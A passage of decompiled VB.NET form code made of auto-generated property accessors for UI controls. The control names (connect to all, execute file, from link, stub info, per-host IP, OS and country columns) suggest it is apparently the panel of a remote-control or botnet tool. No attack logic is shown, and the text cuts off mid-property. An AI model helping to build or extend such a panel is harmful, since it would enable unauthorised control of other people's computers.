            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_notify_CheckedChanged)
                If (Not Me._cb_notify Is Nothing) Then
                    RemoveHandler Me._cb_notify.CheckedChanged, handler
                End If
                Me._cb_notify = value
                If (Not Me._cb_notify Is Nothing) Then
                    AddHandler Me._cb_notify.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_savesettings As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_savesettings
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Me._cb_savesettings = value
            End Set
        End Property

        Friend Overridable Property cb_sc As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_sc
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_sc_CheckedChanged)
                If (Not Me._cb_sc Is Nothing) Then
                    RemoveHandler Me._cb_sc.CheckedChanged, handler
                End If
                Me._cb_sc = value
                If (Not Me._cb_sc Is Nothing) Then
                    AddHandler Me._cb_sc.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property cb_sound As FlatCheckBox
            <DebuggerNonUserCode> _
            Get
                Return Me._cb_sound
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatCheckBox)
                Dim handler As CheckedChangedEventHandler = New CheckedChangedEventHandler(AddressOf Me.cb_sound_CheckedChanged)
                If (Not Me._cb_sound Is Nothing) Then
                    RemoveHandler Me._cb_sound.CheckedChanged, handler
                End If
                Me._cb_sound = value
                If (Not Me._cb_sound Is Nothing) Then
                    AddHandler Me._cb_sound.CheckedChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property CloseButton As FlatClose
            <DebuggerNonUserCode> _
            Get
                Return Me._CloseButton
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatClose)
                Me._CloseButton = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader1 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader1 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader2 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader2 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader3 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader3 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader4 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader4 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader5 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader5 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader6 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader6 = value
            End Set
        End Property

        Friend Overridable Property ColumnHeader7 As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ColumnHeader7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ColumnHeader7 = value
            End Set
        End Property

        Friend Overridable Property ConnectionToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ConnectionToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ConnectionToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ConnectToAllToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ConnectToAllToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ConnectToAllToolStripMenuItem_Click)
                If (Not Me._ConnectToAllToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ConnectToAllToolStripMenuItem.Click, handler
                End If
                Me._ConnectToAllToolStripMenuItem = value
                If (Not Me._ConnectToAllToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ConnectToAllToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ConnectToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ConnectToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._ConnectToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property ContextDeleteHosts As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._ContextDeleteHosts
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._ContextDeleteHosts = value
            End Set
        End Property

        Friend Overridable Property countryflags As ImageList
            <DebuggerNonUserCode> _
            Get
                Return Me._countryflags
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ImageList)
                Me._countryflags = value
            End Set
        End Property

        Friend Overridable Property CountryToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._CountryToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.CountryToolStripMenuItem_Click)
                If (Not Me._CountryToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._CountryToolStripMenuItem.Click, handler
                End If
                Me._CountryToolStripMenuItem = value
                If (Not Me._CountryToolStripMenuItem Is Nothing) Then
                    AddHandler Me._CountryToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DeleteToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DeleteToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Me._DeleteToolStripMenuItem = value
            End Set
        End Property

        Friend Overridable Property DisconnectToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._DisconnectToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.DisconnectToolStripMenuItem_Click)
                If (Not Me._DisconnectToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._DisconnectToolStripMenuItem.Click, handler
                End If
                Me._DisconnectToolStripMenuItem = value
                If (Not Me._DisconnectToolStripMenuItem Is Nothing) Then
                    AddHandler Me._DisconnectToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property DotNetBarTabcontrol1 As DotNetBarTabcontrol
            <DebuggerNonUserCode> _
            Get
                Return Me._DotNetBarTabcontrol1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As DotNetBarTabcontrol)
                Me._DotNetBarTabcontrol1 = value
            End Set
        End Property

        Friend Overridable Property DotNetBarTabcontrol2 As DotNetBarTabcontrol
            <DebuggerNonUserCode> _
            Get
                Return Me._DotNetBarTabcontrol2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As DotNetBarTabcontrol)
                Me._DotNetBarTabcontrol2 = value
            End Set
        End Property

        Friend Overridable Property ExecuteFileToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ExecuteFileToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExecuteFileToolStripMenuItem_Click)
                If (Not Me._ExecuteFileToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExecuteFileToolStripMenuItem.Click, handler
                End If
                Me._ExecuteFileToolStripMenuItem = value
                If (Not Me._ExecuteFileToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExecuteFileToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ExitToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._ExitToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ExitToolStripMenuItem_Click)
                If (Not Me._ExitToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._ExitToolStripMenuItem.Click, handler
                End If
                Me._ExitToolStripMenuItem = value
                If (Not Me._ExitToolStripMenuItem Is Nothing) Then
                    AddHandler Me._ExitToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property FlatGroupBox1 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox1 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox10 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox10 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox11 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox11
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox11 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox2 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox2 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox3 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox3 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox4 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox4 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox5 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox5 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox6 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox6 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox7 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox7 = value
            End Set
        End Property

        Friend Overridable Property FlatGroupBox8 As FlatGroupBox
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatGroupBox8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatGroupBox)
                Me._FlatGroupBox8 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel1 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel10 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel10
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel10 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel11 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel11
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel11 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel12 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel12
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel12 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel13 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel13
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel13 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel14 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel14
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel14 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel15 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel15
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel15 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel16 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel16
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel16 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel17 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel17
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel17 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel18 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel18
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel18 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel19 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel19
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel19 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel2 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel20 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel20
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel20 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel21 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel21
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel21 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel3 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel3 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel4 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel4 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel5 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel5 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel6 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel6
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel6 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel7 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel7
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel7 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel8 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel8
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel8 = value
            End Set
        End Property

        Friend Overridable Property FlatLabel9 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatLabel9
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._FlatLabel9 = value
            End Set
        End Property

        Friend Overridable Property FlatStatusBar1 As FlatStatusBar
            <DebuggerNonUserCode> _
            Get
                Return Me._FlatStatusBar1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStatusBar)
                Me._FlatStatusBar1 = value
            End Set
        End Property

        Friend Overridable Property FormSkin1 As FormSkin
            <DebuggerNonUserCode> _
            Get
                Return Me._FormSkin1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FormSkin)
                Me._FormSkin1 = value
            End Set
        End Property

        Friend Overridable Property FromLinkToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._FromLinkToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.FromLinkToolStripMenuItem_Click)
                If (Not Me._FromLinkToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._FromLinkToolStripMenuItem.Click, handler
                End If
                Me._FromLinkToolStripMenuItem = value
                If (Not Me._FromLinkToolStripMenuItem Is Nothing) Then
                    AddHandler Me._FromLinkToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property HostToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._HostToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.HostToolStripMenuItem_Click)
                If (Not Me._HostToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._HostToolStripMenuItem.Click, handler
                End If
                Me._HostToolStripMenuItem = value
                If (Not Me._HostToolStripMenuItem Is Nothing) Then
                    AddHandler Me._HostToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property ip As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._ip
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._ip = value
            End Set
        End Property

        Friend Overridable Property Labelstubinfo As Label
            <DebuggerNonUserCode> _
            Get
                Return Me._Labelstubinfo
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As Label)
                Me._Labelstubinfo = value
            End Set
        End Property

        Friend Overridable Property LinkLabel1 As LinkLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._LinkLabel1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As LinkLabel)
                Dim handler As LinkLabelLinkClickedEventHandler = New LinkLabelLinkClickedEventHandler(AddressOf Me.LinkLabel1_LinkClicked)
                If (Not Me._LinkLabel1 Is Nothing) Then
                    RemoveHandler Me._LinkLabel1.LinkClicked, handler
                End If
                Me._LinkLabel1 = value
                If (Not Me._LinkLabel1 Is Nothing) Then
                    AddHandler Me._LinkLabel1.LinkClicked, handler
                End If
            End Set
        End Property

        Friend Overridable Property ListView1 As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListView1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Me._ListView1 = value
            End Set
        End Property

        Friend Overridable Property listviewmain As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._listviewmain
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Me._listviewmain = value
            End Set
        End Property

        Friend Overridable Property ListViewNews As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListViewNews
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.ListViewNews_SelectedIndexChanged)
                If (Not Me._ListViewNews Is Nothing) Then
                    RemoveHandler Me._ListViewNews.SelectedIndexChanged, handler
                End If
                Me._ListViewNews = value
                If (Not Me._ListViewNews Is Nothing) Then
                    AddHandler Me._ListViewNews.SelectedIndexChanged, handler
                End If
            End Set
        End Property

        Friend Overridable Property ListViewScan As ListView
            <DebuggerNonUserCode> _
            Get
                Return Me._ListViewScan
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ListView)
                Me._ListViewScan = value
            End Set
        End Property

        Friend Overridable Property location As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._location
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._location = value
            End Set
        End Property

        Friend Overridable Property MapViewToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._MapViewToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MapViewToolStripMenuItem_Click)
                If (Not Me._MapViewToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MapViewToolStripMenuItem.Click, handler
                End If
                Me._MapViewToolStripMenuItem = value
                If (Not Me._MapViewToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MapViewToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property MaxButton As FlatMax
            <DebuggerNonUserCode> _
            Get
                Return Me._MaxButton
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMax)
                Me._MaxButton = value
            End Set
        End Property

        Friend Overridable Property MenuStrip1 As MenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._MenuStrip1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As MenuStrip)
                Me._MenuStrip1 = value
            End Set
        End Property

        Friend Overridable Property MiniButton As FlatMini
            <DebuggerNonUserCode> _
            Get
                Return Me._MiniButton
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatMini)
                Me._MiniButton = value
            End Set
        End Property

        Friend Overridable Property MiscellaneousToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._MiscellaneousToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ToolStripMenuItem)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.MiscellaneousToolStripMenuItem_Click)
                If (Not Me._MiscellaneousToolStripMenuItem Is Nothing) Then
                    RemoveHandler Me._MiscellaneousToolStripMenuItem.Click, handler
                End If
                Me._MiscellaneousToolStripMenuItem = value
                If (Not Me._MiscellaneousToolStripMenuItem Is Nothing) Then
                    AddHandler Me._MiscellaneousToolStripMenuItem.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property NetSealtb1 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._NetSealtb1
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._NetSealtb1 = value
            End Set
        End Property

        Friend Overridable Property NetSealtb2 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._NetSealtb2
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._NetSealtb2 = value
            End Set
        End Property

        Friend Overridable Property NetSealtb3 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._NetSealtb3
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._NetSealtb3 = value
            End Set
        End Property

        Friend Overridable Property NetSealtb4 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._NetSealtb4
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._NetSealtb4 = value
            End Set
        End Property

        Friend Overridable Property NetSealtb5 As FlatLabel
            <DebuggerNonUserCode> _
            Get
                Return Me._NetSealtb5
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatLabel)
                Me._NetSealtb5 = value
            End Set
        End Property

        Friend Overridable Property Notify As NotifyIcon
            <DebuggerNonUserCode> _
            Get
                Return Me._Notify
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As NotifyIcon)
                Dim handler As MouseEventHandler = New MouseEventHandler(AddressOf Me.Notify_MouseDoubleClick)
                If (Not Me._Notify Is Nothing) Then
                    RemoveHandler Me._Notify.MouseDoubleClick, handler
                End If
                Me._Notify = value
                If (Not Me._Notify Is Nothing) Then
                    AddHandler Me._Notify.MouseDoubleClick, handler
                End If
            End Set
        End Property

        Friend Overridable Property notifyrightclick As ContextMenuStrip
            <DebuggerNonUserCode> _
            Get
                Return Me._notifyrightclick
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ContextMenuStrip)
                Me._notifyrightclick = value
            End Set
        End Property

        Friend Overridable Property Opennsbtn As FlatStickyButton
            <DebuggerNonUserCode> _
            Get
                Return Me._Opennsbtn
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As FlatStickyButton)
                Dim handler As EventHandler = New EventHandler(AddressOf Me.Opennsbtn_Click)
                If (Not Me._Opennsbtn Is Nothing) Then
                    RemoveHandler Me._Opennsbtn.Click, handler
                End If
                Me._Opennsbtn = value
                If (Not Me._Opennsbtn Is Nothing) Then
                    AddHandler Me._Opennsbtn.Click, handler
                End If
            End Set
        End Property

        Friend Overridable Property os As ColumnHeader
            <DebuggerNonUserCode> _
            Get
                Return Me._os
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
            Set(ByVal value As ColumnHeader)
                Me._os = value
            End Set
        End Property

        Friend Overridable Property OSToolStripMenuItem As ToolStripMenuItem
            <DebuggerNonUserCode> _
            Get
                Return Me._OSToolStripMenuItem
            End Get
            <MethodImpl(MethodImplOptions.Synchronized), DebuggerNonUserCode> _
